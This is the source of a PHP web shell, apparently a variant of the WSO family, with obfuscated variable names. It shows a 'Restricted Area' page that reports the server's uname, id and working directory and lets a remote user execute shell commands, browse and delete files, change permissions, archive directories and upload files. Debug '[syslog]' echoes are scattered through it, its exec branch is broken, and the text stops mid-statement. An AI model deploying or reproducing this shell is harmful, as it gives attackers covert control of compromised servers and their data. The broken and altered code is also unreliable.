<?php
echo '[syslog]01
'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win') { define('DS', '\\'); $sp6050b9 = 'win'; } else { define('DS', '/'); $sp6050b9 = 'nix'; } if (!function_exists('scandir')) { function scandir($spee51b5) { $spcfdfd7 = opendir($spee51b5); while (false !== ($spcc5ae4 = readdir($spcfdfd7))) { $spf2bff7[] = $spcc5ae4; } return $spf2bff7; } } function scandir_rec($spee51b5, $sp31648a = false, $sp5a5a6f = 0, $sp04e2d0 = false, $spd0628f = false) { $sp62199a = scandir($spee51b5); $sp4c8f1b = array(); if (!$spd0628f) { if (is_dir($spee51b5) || !$sp31648a) { if (!$sp04e2d0 || is_writeable($spee51b5)) { $sp4c8f1b[] = $spee51b5; } } } if ($sp62199a && is_array($sp62199a)) { foreach ($sp62199a as $sp8db113 => $sp6d4391) { if (!preg_match('/^\\./', $sp6d4391)) { if (is_dir($spee51b5 . DS . $sp6d4391) || !$sp31648a) { if (!$sp04e2d0 || is_writeable($spee51b5 . DS . $sp6d4391)) { $sp4c8f1b[] = $spee51b5 . DS . $sp6d4391; } } } echo '[syslog]02_f
'; if (!preg_match('/^\\./', $sp6d4391) && is_dir($spee51b5 . DS . $sp6d4391)) { if ($sp5a5a6f > 0) { $sp6d98c7 = scandir_rec($spee51b5 . DS . $sp6d4391, $sp31648a, $sp5a5a6f - 1, $sp04e2d0, true); if ($sp6d98c7) { foreach ($sp6d98c7 as $spb43ae0 => $spe81c80) { if (is_dir($spee51b5 . DS . $sp6d4391) || !$sp31648a) { if (!$sp04e2d0 || is_writeable($spee51b5 . DS . $spe81c80)) { $sp4c8f1b[] = $spe81c80; } } } } } } } } return $sp4c8f1b; } function cust_function_exists($sp71612e) { echo '[syslog]03_f
'; $sp583c44 = explode(', ', ini_get('disable_functions')); return !in_array($sp71612e, $sp583c44) && function_exists($sp71612e); } function deleteDir($sp149c6d) { $sp149c6d = substr($sp149c6d, -1) == '/' ? $sp149c6d : $sp149c6d . '/'; $spcfdfd7 = opendir($sp149c6d); while (($sp527681 = readdir($spcfdfd7)) !== false) { $sp527681 = $sp149c6d . $sp527681; if (basename($sp527681) == '..' || basename($sp527681) == '.') { continue; } if (is_dir($sp527681)) { deleteDir($sp527681); } elseif (is_file($sp527681)) { @unlink($sp527681); } } closedir($spcfdfd7); @rmdir($sp149c6d); } function smartCopy($sp60cf97, $sp4f8937, $sp7dedaf = array('folderPermission' => 511, 'filePermission' => 511)) { $spb7d120 = false; if (is_file($sp60cf97)) { if ($sp4f8937[strlen($sp4f8937) - 1] == '/') { if (!file_exists($sp4f8937)) { cmfcDirectory::makeAll($sp4f8937, $sp7dedaf['folderPermission'], true); } $spdff285 = $sp4f8937 . '/' . basename($sp60cf97); } else { $spdff285 = $sp4f8937; } $spb7d120 = copy($sp60cf97, $spdff285); chmod($spdff285, $sp7dedaf['filePermission']); } elseif (is_dir($sp60cf97)) { if ($sp4f8937[strlen($sp4f8937) - 1] == '/') { if ($sp60cf97[strlen($sp60cf97) - 1] == '/') { } else { $sp4f8937 = $sp4f8937 . basename($sp60cf97); @mkdir($sp4f8937); chmod($sp4f8937, $sp7dedaf['filePermission']); } } else { if ($sp60cf97[strlen($sp60cf97) - 1] == '/') { @mkdir($sp4f8937, $sp7dedaf['folderPermission']); chmod($sp4f8937, $sp7dedaf['filePermission']); } else { @mkdir($sp4f8937, $sp7dedaf['folderPermission']); chmod($sp4f8937, $sp7dedaf['filePermission']); } } $sp9a27ee = opendir($sp60cf97); while ($sp7ff75d = readdir($sp9a27ee)) { if ($sp7ff75d != '.' && $sp7ff75d != '..') { if (!is_dir($sp60cf97 . '/' . $sp7ff75d)) { $spdff285 = $sp4f8937 . '/' . $sp7ff75d; } else { $spdff285 = $sp4f8937 . '/' . $sp7ff75d; } $spb7d120 = smartCopy($sp60cf97 . '/' . $sp7ff75d, $spdff285, $sp7dedaf); } } closedir($sp9a27ee); } else { $spb7d120 = false; } return $spb7d120; } class archive { function archive($spd86858) { $this->options = array('basedir' => '.', 'name' => $spd86858, 'prepend' => '', 'inmemory' => 0, 'overwrite' => 0, 'recurse' => 1, 'storepaths' => 1, 'followlinks' => 0, 'level' => 3, 'method' => 1, 'sfx' => '', 'type' => '', 'comment' => ''); $this->files = array(); $this->exclude = array(); $this->storeonly = array(); $this->error = array(); } function set_options($sp7dedaf) { foreach ($sp7dedaf as $sp7ac89e => $sp8e17b7) { $this->options[$sp7ac89e] = $sp8e17b7; } if (!empty($this->options['basedir'])) { $this->options['basedir'] = str_replace('\\', '/', $this->options['basedir']); $this->options['basedir'] = preg_replace('/\\/+/', '/', $this->options['basedir']); $this->options['basedir'] = preg_replace('/\\/$/', '', $this->options['basedir']); } if (!empty($this->options['name'])) { $this->options['name'] = str_replace('\\', '/', $this->options['name']); $this->options['name'] = preg_replace('/\\/+/', '/', $this->options['name']); } if (!empty($this->options['prepend'])) { $this->options['prepend'] = str_replace('\\', '/', $this->options['prepend']); $this->options['prepend'] = preg_replace('/^(\\.*\\/+)+/', '', $this->options['prepend']); $this->options['prepend'] = preg_replace('/\\/+/', '/', $this->options['prepend']); $this->options['prepend'] = preg_replace('/\\/$/', '', $this->options['prepend']) . '/'; } } function create_archive() { $this->make_list(); if ($this->options['inmemory'] == 0) { $spd26233 = getcwd(); chdir($this->options['basedir']); if ($this->options['overwrite'] == 0 && file_exists($this->options['name'] . ($this->options['type'] == 'gzip' || $this->options['type'] == 'bzip' ? '.tmp' : ''))) { $this->error[] = "File {$this->options['name']} already exists."; chdir($spd26233); return 0; } else { if ($this->archive = @fopen($this->options['name'] . ($this->options['type'] == 'gzip' || $this->options['type'] == 'bzip' ? '.tmp' : ''), 'wb+')) { chdir($spd26233); } else { $this->error[] = "Could not open {$this->options['name']} for writing."; chdir($spd26233); return 0; } } } else { $this->archive = ''; } switch ($this->options['type']) { case 'zip': if (!$this->create_zip()) { $this->error[] = 'Could not create zip file.'; return 0; } break; case 'bzip': if (!$this->create_tar()) { $this->error[] = 'Could not create tar file.'; return 0; } if (!$this->create_bzip()) { $this->error[] = 'Could not create bzip2 file.'; return 0; } break; case 'gzip': if (!$this->create_tar()) { $this->error[] = 'Could not create tar file.'; return 0; } if (!$this->create_gzip()) { $this->error[] = 'Could not create gzip file.'; return 0; } break; case 'tar': if (!$this->create_tar()) { $this->error[] = 'Could not create tar file.'; return 0; } } if ($this->options['inmemory'] == 0) { fclose($this->archive); if ($this->options['type'] == 'gzip' || $this->options['type'] == 'bzip') { unlink($this->options['basedir'] . '/' . $this->options['name'] . '.tmp'); } } } function add_data($sp410a9e) { if ($this->options['inmemory'] == 0) { fwrite($this->archive, $sp410a9e); } else { $this->archive .= $sp410a9e; } } function make_list() { if (!empty($this->exclude)) { foreach ($this->files as $sp7ac89e => $sp8e17b7) { foreach ($this->exclude as $sp92ac81) { if ($sp8e17b7['name'] == $sp92ac81['name']) { unset($this->files[$sp7ac89e]); } } } } if (!empty($this->storeonly)) { foreach ($this->files as $sp7ac89e => $sp8e17b7) { foreach ($this->storeonly as $sp92ac81) { if ($sp8e17b7['name'] == $sp92ac81['name']) { $this->files[$sp7ac89e]['method'] = 0; } } } } unset($this->exclude, $this->storeonly); } function add_files($sp546283) { $spc44fb2 = $this->list_files($sp546283); foreach ($spc44fb2 as $sp92ac81) { $this->files[] = $sp92ac81; } } function exclude_files($sp546283) { $spc44fb2 = $this->list_files($sp546283); foreach ($spc44fb2 as $sp92ac81) { $this->exclude[] = $sp92ac81; } } function store_files($sp546283) { $spc44fb2 = $this->list_files($sp546283); foreach ($spc44fb2 as $sp92ac81) { $this->storeonly[] = $sp92ac81; } } function list_files($sp546283) { if (!is_array($sp546283)) { $spc44fb2 = $sp546283; $sp546283 = array($spc44fb2); unset($spc44fb2); } $spf2bff7 = array(); $spd26233 = getcwd(); chdir($this->options['basedir']); foreach ($sp546283 as $sp92ac81) { $sp92ac81 = str_replace('\\', '/', $sp92ac81); $sp92ac81 = preg_replace('/\\/+/', '/', $sp92ac81); $sp92ac81 = preg_replace('/\\/$/', '', $sp92ac81); if (strstr($sp92ac81, '*')) { $sp6b2d83 = preg_replace('/([\\\\^$\\.\\[\\]\\|\\(\\)\\?\\+\\{\\}\\/])/', '\\\\\\1', $sp92ac81); $sp6b2d83 = str_replace('*', '.*', $sp6b2d83); $spee51b5 = strstr($sp92ac81, '/') ? substr($sp92ac81, 0, strrpos($sp92ac81, '/')) : '.'; $spc44fb2 = $this->parse_dir($spee51b5); foreach ($spc44fb2 as $sp13cbd8) { if (preg_match("/^{$sp6b2d83}\$/i", $sp13cbd8['name'])) { $spf2bff7[] = $sp13cbd8; } } unset($sp6b2d83, $spee51b5, $spc44fb2, $sp92ac81); } else { if (@is_dir($sp92ac81)) { $spc44fb2 = $this->parse_dir($sp92ac81); foreach ($spc44fb2 as $sp7ff75d) { $spf2bff7[] = $sp7ff75d; } unset($spc44fb2, $sp7ff75d); } else { if (@file_exists($sp92ac81)) { $spf2bff7[] = array('name' => $sp92ac81, 'name2' => $this->options['prepend'] . preg_replace('/(\\.+\\/+)+/', '', $this->options['storepaths'] == 0 && strstr($sp92ac81, '/') ? substr($sp92ac81, strrpos($sp92ac81, '/') + 1) : $sp92ac81), 'type' => @is_link($sp92ac81) && $this->options['followlinks'] == 0 ? 2 : 0, 'ext' => substr($sp92ac81, strrpos($sp92ac81, '.')), 'stat' => stat($sp92ac81)); } } } } chdir($spd26233); unset($sp92ac81, $spd26233); usort($spf2bff7, array('archive', 'sort_files')); return $spf2bff7; } function parse_dir($sp6d7e4a) { if ($this->options['storepaths'] == 1 && !preg_match('/^(\\.+\\/*)+$/', $sp6d7e4a)) { $spf2bff7 = array(array('name' => $sp6d7e4a, 'name2' => $this->options['prepend'] . preg_replace('/(\\.+\\/+)+/', '', $this->options['storepaths'] == 0 && strstr($sp6d7e4a, '/') ? substr($sp6d7e4a, strrpos($sp6d7e4a, '/') + 1) : $sp6d7e4a), 'type' => 5, 'stat' => stat($sp6d7e4a))); } else { $spf2bff7 = array(); } $spee51b5 = @opendir($sp6d7e4a); while ($sp7ff75d = @readdir($spee51b5)) { $sp059327 = $sp6d7e4a . '/' . $sp7ff75d; if ($sp7ff75d == '.' || $sp7ff75d == '..') { continue; } else { if (@is_dir($sp059327)) { if (empty($this->options['recurse'])) { continue; } $spc44fb2 = $this->parse_dir($sp059327); foreach ($spc44fb2 as $sp158e5e) { $spf2bff7[] = $sp158e5e; } } else { if (@file_exists($sp059327)) { $spf2bff7[] = array('name' => $sp059327, 'name2' => $this->options['prepend'] . preg_replace('/(\\.+\\/+)+/', '', $this->options['storepaths'] == 0 && strstr($sp059327, '/') ? substr($sp059327, strrpos($sp059327, '/') + 1) : $sp059327), 'type' => @is_link($sp059327) && $this->options['followlinks'] == 0 ? 2 : 0, 'ext' => substr($sp7ff75d, strrpos($sp7ff75d, '.')), 'stat' => stat($sp059327)); } } } } @closedir($spee51b5); return $spf2bff7; } function sort_files($spd09f64, $sp20e3ac) { if ($spd09f64['type'] != $sp20e3ac['type']) { if ($spd09f64['type'] == 5 || $sp20e3ac['type'] == 2) { return -1; } else { if ($spd09f64['type'] == 2 || $sp20e3ac['type'] == 5) { return 1; } else { if ($spd09f64['type'] == 5) { return strcmp(strtolower($spd09f64['name']), strtolower($sp20e3ac['name'])); } else { if ($spd09f64['ext'] != $sp20e3ac['ext']) { return strcmp($spd09f64['ext'], $sp20e3ac['ext']); } else { if ($spd09f64['stat'][7] != $sp20e3ac['stat'][7]) { return $spd09f64['stat'][7] > $sp20e3ac['stat'][7] ? -1 : 1; } else { return strcmp(strtolower($spd09f64['name']), strtolower($sp20e3ac['name'])); } } } } } } return 0; } function download_file() { if ($this->options['inmemory'] == 0) { $this->error[] = 'Can only use download_file() if archive is in memory. Redirect to file otherwise, it is faster.'; return; } switch ($this->options['type']) { case 'zip': header('Content-Type: application/zip'); break; case 'bzip': header('Content-Type: application/x-bzip2'); break; case 'gzip': header('Content-Type: application/x-gzip'); break; case 'tar': header('Content-Type: application/x-tar'); } $spb3a0ec = 'Content-Disposition: attachment; filename="'; $spb3a0ec .= strstr($this->options['name'], '/') ? substr($this->options['name'], strrpos($this->options['name'], '/') + 1) : $this->options['name']; $spb3a0ec .= '"'; header($spb3a0ec); header('Content-Length: ' . strlen($this->archive)); header('Content-Transfer-Encoding: binary'); header('Cache-Control: no-cache, must-revalidate, max-age=60'); header('Expires: Sat, 01 Jan 2000 12:00:00 GMT'); print $this->archive; } } class tar_file extends archive { function tar_file($spd86858) { $this->archive($spd86858); $this->options['type'] = 'tar'; } function create_tar() { $spd26233 = getcwd(); chdir($this->options['basedir']); foreach ($this->files as $sp92ac81) { if ($sp92ac81['name'] == $this->options['name']) { continue; } if (strlen($sp92ac81['name2']) > 99) { $sp149c6d = substr($sp92ac81['name2'], 0, strpos($sp92ac81['name2'], '/', strlen($sp92ac81['name2']) - 100) + 1); $sp92ac81['name2'] = substr($sp92ac81['name2'], strlen($sp149c6d)); if (strlen($sp149c6d) > 154 || strlen($sp92ac81['name2']) > 99) { $this->error[] = "Could not add {$sp149c6d}{$sp92ac81['name2']} to archive because the filename is too long."; continue; } } $sp41cfcf = pack('a100a8a8a8a12a12a8a1a100a6a2a32a32a8a8a155a12', $sp92ac81['name2'], sprintf('%07o', $sp92ac81['stat'][2]), sprintf('%07o', $sp92ac81['stat'][4]), sprintf('%07o', $sp92ac81['stat'][5]), sprintf('%011o', $sp92ac81['type'] == 2 ? 0 : $sp92ac81['stat'][7]), sprintf('%011o', $sp92ac81['stat'][9]), '        ', $sp92ac81['type'], $sp92ac81['type'] == 2 ? @readlink($sp92ac81['name']) : '', 'ustar ', ' ', 'Unknown', 'Unknown', '', '', !empty($sp149c6d) ? $sp149c6d : '', ''); $sp725e8b = 0; for ($sp412bbc = 0; $sp412bbc < 512; $sp412bbc++) { $sp725e8b += ord(substr($sp41cfcf, $sp412bbc, 1)); } $sp725e8b = pack('a8', sprintf('%07o', $sp725e8b)); $sp41cfcf = substr_replace($sp41cfcf, $sp725e8b, 148, 8); if ($sp92ac81['type'] == 2 || $sp92ac81['stat'][7] == 0) { $this->add_data($sp41cfcf); } else { if ($spe0ea16 = @fopen($sp92ac81['name'], 'rb')) { $this->add_data($sp41cfcf); while ($spc44fb2 = fread($spe0ea16, 1048576)) { $this->add_data($spc44fb2); } if ($sp92ac81['stat'][7] % 512 > 0) { $spc44fb2 = ''; for ($sp412bbc = 0; $sp412bbc < 512 - $sp92ac81['stat'][7] % 512; $sp412bbc++) { $spc44fb2 .= ' '; } $this->add_data($spc44fb2); } fclose($spe0ea16); } else { $this->error[] = "Could not open file {$sp92ac81['name']} for reading. It was not added."; } } } $this->add_data(pack('a1024', '')); chdir($spd26233); return 1; } function extract_files() { $spd26233 = getcwd(); chdir($this->options['basedir']); if ($spe0ea16 = $this->open_archive()) { if ($this->options['inmemory'] == 1) { $this->files = array(); } while ($sp41cfcf = fread($spe0ea16, 512)) { $spc44fb2 = unpack('a100name/a8mode/a8uid/a8gid/a12size/a12mtime/a8checksum/a1type/a100symlink/a6magic/a2temp/a32temp/a32temp/a8temp/a8temp/a155prefix/a12temp', $sp41cfcf); $sp7ff75d = array('name' => $spc44fb2['prefix'] . $spc44fb2['name'], 'stat' => array(2 => $spc44fb2['mode'], 4 => octdec($spc44fb2['uid']), 5 => octdec($spc44fb2['gid']), 7 => octdec($spc44fb2['size']), 9 => octdec($spc44fb2['mtime'])), 'checksum' => octdec($spc44fb2['checksum']), 'type' => $spc44fb2['type'], 'magic' => $spc44fb2['magic']); if ($sp7ff75d['checksum'] == 0) { break; } else { if (substr($sp7ff75d['magic'], 0, 5) != 'ustar') { $this->error[] = 'This script does not support extracting this type of tar file.'; break; } } $sp41cfcf = substr_replace($sp41cfcf, '        ', 148, 8); $sp725e8b = 0; for ($sp412bbc = 0; $sp412bbc < 512; $sp412bbc++) { $sp725e8b += ord(substr($sp41cfcf, $sp412bbc, 1)); } if ($sp7ff75d['checksum'] != $sp725e8b) { $this->error[] = "Could not extract from {$this->options['name']}, it is corrupt."; } if ($this->options['inmemory'] == 1) { $sp7ff75d['data'] = fread($spe0ea16, $sp7ff75d['stat'][7]); fread($spe0ea16, 512 - $sp7ff75d['stat'][7] % 512 == 512 ? 0 : 512 - $sp7ff75d['stat'][7] % 512); unset($sp7ff75d['checksum'], $sp7ff75d['magic']); $this->files[] = $sp7ff75d; } else { if ($sp7ff75d['type'] == 5) { if (!is_dir($sp7ff75d['name'])) { mkdir($sp7ff75d['name'], $sp7ff75d['stat'][2]); } } else { if ($this->options['overwrite'] == 0 && file_exists($sp7ff75d['name'])) { $this->error[] = "{$sp7ff75d['name']} already exists."; continue; } else { if ($sp7ff75d['type'] == 2) { symlink($spc44fb2['symlink'], $sp7ff75d['name']); chmod($sp7ff75d['name'], $sp7ff75d['stat'][2]); } else { if ($sped753c = @fopen($sp7ff75d['name'], 'wb')) { fwrite($sped753c, fread($spe0ea16, $sp7ff75d['stat'][7])); fread($spe0ea16, 512 - $sp7ff75d['stat'][7] % 512 == 512 ? 0 : 512 - $sp7ff75d['stat'][7] % 512); fclose($sped753c); chmod($sp7ff75d['name'], $sp7ff75d['stat'][2]); } else { $this->error[] = "Could not open {$sp7ff75d['name']} for writing."; continue; } } } } } chown($sp7ff75d['name'], $sp7ff75d['stat'][4]); chgrp($sp7ff75d['name'], $sp7ff75d['stat'][5]); touch($sp7ff75d['name'], $sp7ff75d['stat'][9]); unset($sp7ff75d); } } else { $this->error[] = "Could not open file {$this->options['name']}"; } chdir($spd26233); } function open_archive() { return @fopen($this->options['name'], 'rb'); } } class gzip_file extends tar_file { function gzip_file($spd86858) { $this->tar_file($spd86858); $this->options['type'] = 'gzip'; } function create_gzip() { if ($this->options['inmemory'] == 0) { $spd26233 = getcwd(); chdir($this->options['basedir']); if ($spe0ea16 = gzopen($this->options['name'], "wb{$this->options['level']}")) { fseek($this->archive, 0); while ($spc44fb2 = fread($this->archive, 1048576)) { gzwrite($spe0ea16, $spc44fb2); } gzclose($spe0ea16); chdir($spd26233); } else { $this->error[] = "Could not open {$this->options['name']} for writing."; chdir($spd26233); return 0; } } else { $this->archive = gzencode($this->archive, $this->options['level']); } return 1; } function open_archive() { return @gzopen($this->options['name'], 'rb'); } } class bzip_file extends tar_file { function bzip_file($spd86858) { $this->tar_file($spd86858); $this->options['type'] = 'bzip'; } function create_bzip() { if ($this->options['inmemory'] == 0) { $spd26233 = getcwd(); chdir($this->options['basedir']); if ($spe0ea16 = bzopen($this->options['name'], 'wb')) { fseek($this->archive, 0); while ($spc44fb2 = fread($this->archive, 1048576)) { bzwrite($spe0ea16, $spc44fb2); } bzclose($spe0ea16); chdir($spd26233); } else { $this->error[] = "Could not open {$this->options['name']} for writing."; chdir($spd26233); return 0; } } else { $this->archive = bzcompress($this->archive, $this->options['level']); } return 1; } function open_archive() { return @bzopen($this->options['name'], 'rb'); } } class zip_file extends archive { function zip_file($spd86858) { $this->archive($spd86858); $this->options['type'] = 'zip'; } function create_zip() { $spf2bff7 = 0; $spc6ade9 = 0; $spcd42ee = ''; if (!empty($this->options['sfx'])) { if ($spe0ea16 = @fopen($this->options['sfx'], 'rb')) { $spc44fb2 = fread($spe0ea16, filesize($this->options['sfx'])); fclose($spe0ea16); $this->add_data($spc44fb2); $spc6ade9 += strlen($spc44fb2); unset($spc44fb2); } else { $this->error[] = "Could not open sfx module from {$this->options['sfx']}."; } } $spd26233 = getcwd(); chdir($this->options['basedir']); foreach ($this->files as $sp92ac81) { if ($sp92ac81['name'] == $this->options['name']) { continue; } $sp89beff = explode(' ', date('Y n j G i s', $sp92ac81['stat'][9])); $sp89beff = $sp89beff[0] - 1980 << 25 | $sp89beff[1] << 21 | $sp89beff[2] << 16 | $sp89beff[3] << 11 | $sp89beff[4] << 5 | $sp89beff[5]; $sp41cfcf = pack('VvvvV', 67324752, 10, 0, isset($sp92ac81['method']) || $this->options['method'] == 0 ? 0 : 8, $sp89beff); if ($sp92ac81['stat'][7] == 0 && $sp92ac81['type'] == 5) { $sp41cfcf .= pack('VVVvv', 0, 0, 0, strlen($sp92ac81['name2']) + 1, 0); $sp41cfcf .= $sp92ac81['name2'] . '/'; $this->add_data($sp41cfcf); $spcd42ee .= pack('VvvvvVVVVvvvvvVV', 33639248, 20, $this->options['method'] == 0 ? 0 : 10, 0, isset($sp92ac81['method']) || $this->options['method'] == 0 ? 0 : 8, $sp89beff, 0, 0, 0, strlen($sp92ac81['name2']) + 1, 0, 0, 0, 0, $sp92ac81['type'] == 5 ? 16 : 0, $spc6ade9); $spcd42ee .= $sp92ac81['name2'] . '/'; $spf2bff7++; $spc6ade9 += 31 + strlen($sp92ac81['name2']); } else { if ($sp92ac81['stat'][7] == 0) { $sp41cfcf .= pack('VVVvv', 0, 0, 0, strlen($sp92ac81['name2']), 0); $sp41cfcf .= $sp92ac81['name2']; $this->add_data($sp41cfcf); $spcd42ee .= pack('VvvvvVVVVvvvvvVV', 33639248, 20, $this->options['method'] == 0 ? 0 : 10, 0, isset($sp92ac81['method']) || $this->options['method'] == 0 ? 0 : 8, $sp89beff, 0, 0, 0, strlen($sp92ac81['name2']), 0, 0, 0, 0, $sp92ac81['type'] == 5 ? 16 : 0, $spc6ade9); $spcd42ee .= $sp92ac81['name2']; $spf2bff7++; $spc6ade9 += 30 + strlen($sp92ac81['name2']); } else { if ($spe0ea16 = @fopen($sp92ac81['name'], 'rb')) { $spc44fb2 = fread($spe0ea16, $sp92ac81['stat'][7]); fclose($spe0ea16); $sp938094 = crc32($spc44fb2); if (!isset($sp92ac81['method']) && $this->options['method'] == 1) { $spc44fb2 = gzcompress($spc44fb2, $this->options['level']); $spbb5bfd = strlen($spc44fb2) - 6; $spc44fb2 = substr($spc44fb2, 2, $spbb5bfd); } else { $spbb5bfd = strlen($spc44fb2); } $sp41cfcf .= pack('VVVvv', $sp938094, $spbb5bfd, $sp92ac81['stat'][7], strlen($sp92ac81['name2']), 0); $sp41cfcf .= $sp92ac81['name2']; $this->add_data($sp41cfcf); $this->add_data($spc44fb2); unset($spc44fb2); $spcd42ee .= pack('VvvvvVVVVvvvvvVV', 33639248, 20, $this->options['method'] == 0 ? 0 : 10, 0, isset($sp92ac81['method']) || $this->options['method'] == 0 ? 0 : 8, $sp89beff, $sp938094, $spbb5bfd, $sp92ac81['stat'][7], strlen($sp92ac81['name2']), 0, 0, 0, 0, 0, $spc6ade9); $spcd42ee .= $sp92ac81['name2']; $spf2bff7++; $spc6ade9 += 30 + strlen($sp92ac81['name2']) + $spbb5bfd; } else { $this->error[] = "Could not open file {$sp92ac81['name']} for reading. It was not added."; } } } } $this->add_data($spcd42ee); $this->add_data(pack('VvvvvVVv', 101010256, 0, 0, $spf2bff7, $spf2bff7, strlen($spcd42ee), $spc6ade9, !empty($this->options['comment']) ? strlen($this->options['comment']) : 0)); if (!empty($this->options['comment'])) { $this->add_data($this->options['comment']); } chdir($spd26233); return 1; } } function copy_paste($sp559d1c, $sp1acd5c, $sp96625c) { if (is_dir($sp559d1c . $sp1acd5c)) { mkdir($sp96625c . $sp1acd5c); $sp4a7259 = @opendir($sp559d1c . $sp1acd5c); while (($sp1b2b3c = @readdir($sp4a7259)) !== false) { if ($sp1b2b3c != '.' and $sp1b2b3c != '..') { copy_paste($sp559d1c . $sp1acd5c . DS, $sp1b2b3c, $sp96625c . $sp1acd5c . DS); } } } elseif (is_file($sp559d1c . $sp1acd5c)) { @copy($sp559d1c . $sp1acd5c, $sp96625c . $sp1acd5c); } } function system_custom($spa16d92) { $spb3b003 = ''; $spee0b99 = false; if (cust_function_exists('exec')) { $spee0b99 = true; echo '[syslog]03_f
'; $spb3b003 = @join('
', $spb3b003); } elseif (cust_function_exists('passthru')) { $spee0b99 = true; ob_start(); @passthru($spa16d92); $spb3b003 = ob_get_clean(); } elseif (cust_function_exists('system')) { $spee0b99 = true; ob_start(); @system($spa16d92); $spb3b003 = ob_get_clean(); } elseif (cust_function_exists('shell_exec')) { $spee0b99 = true; $spb3b003 = shell_exec($spa16d92); } elseif (is_resource($sp1b2b3c = @popen($spa16d92, 'r'))) { $spee0b99 = true; $spb3b003 = ''; while (!@feof($sp1b2b3c)) { $spb3b003 .= fread($sp1b2b3c, 1024); } pclose($sp1b2b3c); } if ($spee0b99) { return $spb3b003; } $sp3d6490 = explode(';', $spa16d92); $spb3b003 = ''; $sp149c6d = ''; if ($sp3d6490) { foreach ($sp3d6490 as $sp2603de) { $spf74450 = explode(' ', $sp2603de); $spd1fd73 = $spf74450[0]; $spfa9737 = array(); if (count($spf74450) > 1) { for ($sp412bbc = 1; $sp412bbc < count($spf74450); $sp412bbc++) { $spfa9737[] = trim($spf74450[$sp412bbc]); } } switch ($spd1fd73) { case 'cd': if ($spfa9737[0]) { $sp149c6d = $spfa9737[0]; if (is_dir($sp149c6d)) { @chdir($sp149c6d); } } break; case 'tar': if (count($spfa9737) > 1) { $spee83ab = new gzip_file($spfa9737[0]); $spee83ab->set_options(array('basedir' => $sp149c6d, 'overwrite' => 1, 'level' => 1)); $spee83ab->add_files(array($spfa9737[1])); $spee83ab->create_archive(); } break; case 'zip': if (class_exists('ZipArchive') && count($spfa9737) > 1) { $sp021d9f = new ZipArchive(); if ($sp021d9f->open($spfa9737[0], 1)) { foreach ($spfa9737 as $sp8db113 => $spb8cde5) { if ($sp8db113 == 0 || $spb8cde5 == '..') { continue; } if (@is_file($spb8cde5)) { $sp021d9f->addFile($spb8cde5, $spb8cde5); } elseif (@is_dir($spb8cde5)) { $sp687824 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($spb8cde5 . DS)); foreach ($sp687824 as $sp7ac89e => $sp8e17b7) { $sp021d9f->addFile(realpath($sp7ac89e), $sp7ac89e); } } } $sp021d9f->close(); } } break; case 'unzip': if (class_exists('ZipArchive') && count($spfa9737) > 0) { $sp021d9f = new ZipArchive(); foreach ($spfa9737 as $sp8db113 => $spb8cde5) { if ($sp021d9f->open($spb8cde5)) { $sp021d9f->extractTo($sp149c6d); $sp021d9f->close(); } } } break; case 'cp': smartCopy($spfa9737[0], $spfa9737[1]); break; case 'mv': @rename($spfa9737[0], $spfa9737[1]); break; case 'rm': foreach ($spfa9737 as $spb8cde5) { if (!preg_match('/^-/', $spb8cde5)) { if ($spb8cde5 == '..') { continue; } $spb8cde5 = urldecode($spb8cde5); if (is_dir($spb8cde5)) { deleteDir($spb8cde5); } elseif (is_file($spb8cde5)) { @unlink($spb8cde5); } } } break; case 'uname': $spb3b003 = php_uname(preg_replace('/^-/', '', $spfa9737[0])); break; case 'find': $spb3b003 = scandir_rec($spfa9737[0], true, 1); $spb3b003 = implode('
', $spb3b003); break; case 'ls': if (isset($spfa9737[0]) && $spfa9737[0] == '-F') { $spcb4717 = $sp149c6d; if (isset($spfa9737[1])) { $spcb4717 = $spfa9737[1]; } $spb3b003 = glob($spcb4717 . '/*', GLOB_ONLYDIR); if (!empty($spb3b003)) { foreach ($spb3b003 as $sp8db113 => $sp6d4391) { $spb3b003[$sp8db113] = preg_replace('/^' . preg_quote($spcb4717 . DS, DS) . '/', '', $sp6d4391) . DS; } } $spb3b003 = implode('
', $spb3b003); } else { $spcb4717 = $sp149c6d; if (isset($spfa9737[1])) { $spcb4717 = $spfa9737[1]; } $spb3b003 = glob($spcb4717 . '/*'); if (!empty($spb3b003)) { foreach ($spb3b003 as $sp8db113 => $sp6d4391) { $spb3b003[$sp8db113] = preg_replace('/^' . preg_quote($sp149c6d, DS) . '/', '', $sp6d4391); } } $spb3b003 = implode('
', $spb3b003); } break; case 'mkdir': @mkdir($spfa9737[0]); break; case 'chmod': @chmod($spfa9737[1], $spfa9737[0]); break; case 'phpversion': $spb3b003 = phpversion(); break; case 'wso_version': $spb3b003 = '2.4'; break; case 'safemode': $spb3b003 = @ini_get('safe_mode'); break; case 'pwd': $spb3b003 = getcwd(); break; default: break; } } } return $spb3b003; } print '<style>body{font-family:trebuchet ms;font-size:16px;}hr{width:100%;height:2px;}</style>'; print '<center><h1>Restricted</h1></center>'; print '<center><h1>Area</h1></center>'; print '<hr><hr>'; echo '[syslog]04
'; if (isset($_POST['_cwd'])) { $spf13d6a = str_replace('\\\\', '\\', $_POST['_cwd']); } else { $spf13d6a = ''; } if (isset($_POST['_cmd'])) { $sp93f2fd = str_replace('\\\\', '\\', $_POST['_cmd']); } else { $sp93f2fd = ''; } $spc07470 = system_custom('uname -a'); $sp348297 = system_custom('pwd'); $sp53d924 = system_custom('id'); if ($spf13d6a == '') { $spf13d6a = $sp348297; } print '<table>'; print '<tr><td><b>?:</b></td><td>' . (isset($_SERVER['REMOTE_HOST']) ? $_SERVER['REMOTE_HOST'] : '') . ' (' . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '') . ')</td></tr>'; print '<tr><td><b>s is:</b></td><td>' . (isset($_SERVER['SERVER_SIGNATURE']) ? $_SERVER['SERVER_SIGNATURE'] : '') . '</td></tr>'; print "<tr><td><b>ce e?:</b></td><td>{$spc07470}</td></tr>"; print "<tr><td><b>wtf:</b></td><td>{$sp53d924}</td></tr>"; print '</table>'; print '<hr><hr>'; if (isset($_POST['_act']) && $_POST['_act'] == 'List files!') { $sp93f2fd = 'ls -la'; } print '<form method=post enctype="multipart/form-data"><table>'; print '<tr><td><b>Execute command:</b></td><td><input size=100 name="_cmd" value="' . $sp93f2fd . '"></td>'; print '<td><input type=submit name=_act value="Execute!"></td></tr>'; print '<tr><td><b>Change directory:</b></td><td><input size=100 name="_cwd" value="' . $spf13d6a . '"></td>'; print '<td><input type=submit name=_act value="List files!"></td></tr>'; print '<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>'; print 